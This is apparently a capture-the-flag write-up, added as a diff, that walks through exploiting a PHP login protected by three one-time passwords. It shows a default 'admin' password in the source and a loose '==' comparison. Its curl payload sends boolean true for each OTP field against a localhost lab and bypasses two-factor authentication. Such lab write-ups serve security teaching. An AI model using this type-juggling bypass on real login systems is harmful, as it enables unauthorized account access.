@@ -1,0 +1,71 @@
+### Structured Approach to Identifying and Exploiting the Vulnerability
+
+#### 1. Initial Reconnaissance
+
+1. **Gather Documentation and Files**: Collect all available documentation and source files, such as `README.md`, `google2fa.php`, `login.php`, etc.
+2. **Understand the Application Workflow**: Determine the purpose of the application and its intended functionality. The application uses multiple OTPs for authentication.
+
+#### 2. Identify Entry Points and Critical Code
+
+1. **Locate Authentication Logic**: Focus on files and functions that handle authentication, such as `login.php` and `google2fa.php`.
+
+   Example from `login.php`:
+   ```php
+   $USER_DB = [
+       "admin" => [
+           "password_hash" => password_hash("admin", PASSWORD_DEFAULT),
+           "key1" => Google2FA::generate_secret_key(),
+           "key2" => Google2FA::generate_secret_key(),
+           "key3" => Google2FA::generate_secret_key()
+       ]
+   ];
+   ```
+
+2. **Review the Code**: Identify where user inputs are handled and validated, particularly focusing on type comparison vulnerabilities.
+
+   Example from `google2fa.php`:
+   ```php
+   if (self::oath_hotp($binarySeed, $ts) == $key)
+   ```
+
+#### 3. Analyze the Vulnerability
+
+1. **Understand the Comparison Logic**: Recognize that the `==` operator in PHP performs type-coercive comparison, which can be exploited.
+2. **Formulate Hypotheses**: Hypothesize that passing values that cause type coercion (like boolean `true`) could bypass the OTP check.
+
+#### 4. Information Disclosure
+
+1. **Test Error Responses**: Use error messages to gather information. Craft `curl` commands to test for error responses that disclose specific information.
+
+   Example test payloads:
+   ```bash
+   # Test with correct username but wrong password
+   curl 'http://127.0.0.1:8901/login.php' --data '{"username":"admin","password":"wrongpassword"}'
+   # Response: "Error: wrong password"
+   ```
+
+   ```bash
+   # Test with correct username and password but wrong OTP1
+   curl 'http://127.0.0.1:8901/login.php' --data '{"username":"admin","password":"admin","otp1":"wrongotp"}'
+   # Response: "Error: wrong OTP1"
+   ```
+
+#### 5. Testing the Hypothesis
+
+1. **Craft Payloads**: The tests seem to validate our hypothesis. Proceed to try the hypothesised exploit.
+   ```bash
+   curl 'http://127.0.0.1:8901/login.php' --data '{"username":"admin","password":"admin","otp1":true,"otp2":true,"otp3":true}'
+   ```
+
+2. Recieve response with flag!
+
+### Summary
+
+By following a structured approach, you can systematically identify and exploit vulnerabilities in a web application. This involves:
+1. **Initial Reconnaissance**: Gathering documentation and understanding the application workflow.
+2. **Identifying Entry Points**: Reviewing critical code for vulnerabilities.
+3. **Analyzing the Vulnerability**: Understanding comparison logic and formulating hypotheses.
+(If Neccesary) 4. **Leveraging Information Disclosure**: Using error messages to gather clues.
+5. **Testing the Hypothesis**: Crafting payload to exploit vulnerabilities.
+
+In this case, the default password "admin" was identified from the source code initialization in `login.php`, and the type coercion vulnerability in `google2fa.php` was exploited by sending boolean `true` values for OTP parameters. 
